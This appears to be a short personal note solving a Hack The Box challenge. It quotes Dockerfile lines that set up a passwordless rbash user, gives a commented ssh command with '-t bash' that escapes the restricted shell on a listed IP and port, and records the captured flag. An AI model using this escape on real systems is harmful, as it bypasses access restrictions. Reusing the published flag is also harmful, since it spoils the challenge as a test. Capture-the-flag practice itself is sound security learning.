'''
ask chatgpt for 
RUN adduser --disabled-password restricted
RUN usermod --shell /bin/rbash restricted
RUN sed -i -re 's/^restricted:[^:]+:/restricted::/' /etc/passwd /etc/shadow

search for how to escape rbash
'''

#ssh restricted@139.59.173.68 -p 30402 -t bash
#HTB{r35tr1ct10n5_4r3_p0w3r1355}
